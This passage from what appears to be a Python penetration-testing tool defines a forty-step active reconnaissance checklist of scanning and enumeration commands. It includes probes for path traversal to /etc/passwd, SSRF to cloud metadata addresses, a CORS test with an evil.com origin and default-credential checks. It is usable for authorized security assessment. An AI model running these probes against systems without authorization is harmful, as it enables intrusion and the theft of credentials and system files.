    "38. SEC filings (EDGAR) — subsidiaries, acquisitions, IT infrastructure references",
    "39. Annual reports / press releases — vendor partnerships, systems",
    "40. News/media — data breach history, security incidents, acquisitions",
]

                                                                                 
                                  
                                                                                 

ACTIVE_RECON_CHECKLIST = [
    "01. Port scan — nmap -sV -sC -p- -T4 target",
    "02. UDP scan — nmap -sU --top-ports 200 target",
    "03. Service version detection — nmap -sV --version-intensity 9 target",
    "04. OS detection — nmap -O target",
    "05. NSE vulnerability scripts — nmap --script vuln target",
    "06. Web directory enumeration — gobuster/ffuf with large wordlist",
    "07. Virtual host enumeration — ffuf -H 'Host: FUZZ.target.com' -w vhosts.txt",
    "08. Parameter discovery — ffuf/arjun on all endpoints",
    "09. Subdomain brute-force — dnsx/shuffledns with wordlist",
    "10. Web crawling — gospider, hakrawler, katana",
    "11. JavaScript analysis — linkfinder, jsluice, secretfinder",
    "12. WAF detection — wafw00f, nmap http-waf-detect",
    "13. Technology fingerprinting — whatweb, wappalyzer",
    "14. SSL/TLS scan — testssl.sh, sslscan, sslyze",
    "15. SMTP enumeration — VRFY/EXPN/RCPT TO user enumeration",
    "16. SMB enumeration — nmap smb-*, enum4linux-ng, smbmap, smbclient",
    "17. SNMP walk — snmpwalk -v 2c -c public target",
    "18. LDAP enumeration — ldapsearch null bind, windapsearch",
    "19. NFS mount enumeration — showmount -e target",
    "20. RPC enumeration — rpcinfo -p target",
    "21. DNS brute-force — gobuster dns, amass enum -active",
    "22. DNS cache snooping — check resolver cache for domain queries",
    "23. HTTP methods — OPTIONS request on all endpoints",
    "24. HTTP headers collection — whatweb, curl -I target",
    "25. Robots.txt and sitemap.xml — map all paths",
    "26. Backup file discovery — gobuster with backup extensions wordlist",
    "27. API endpoint discovery — kiterunner, gobuster with API wordlist",
    "28. GraphQL introspection — curl -X POST with introspection query",
    "29. Error page fingerprinting — trigger 404/500 errors, read stack traces",
    "30. Authentication mechanism analysis — identify auth type, tokens, headers",
    "31. Session token analysis — collect multiple tokens, check randomness/entropy",
    "32. CORS probe — send Origin: https://evil.com, check ACAO response header",
    "33. Input fuzzing — send special characters to all inputs, observe behavior",
    "34. File upload testing — upload different MIME types, check storage location",
    "35. Third-party integrations — identify third-party scripts/APIs in use",
    "36. Mobile app analysis — decompile APK/IPA, extract endpoints and secrets",
    "37. Cloud metadata probe — test SSRF to 169.254.169.254, 100.100.100.200",
    "38. Internal IP disclosure — X-Forwarded-For, X-Real-IP, error messages",
    "39. Path traversal probe — ../../../../etc/passwd on file parameters",
    "40. Default credentials check — test common defaults on all login panels",
]

                                                                                 
                                 
                                                                                 


if __name__ == "__main__":
    main()
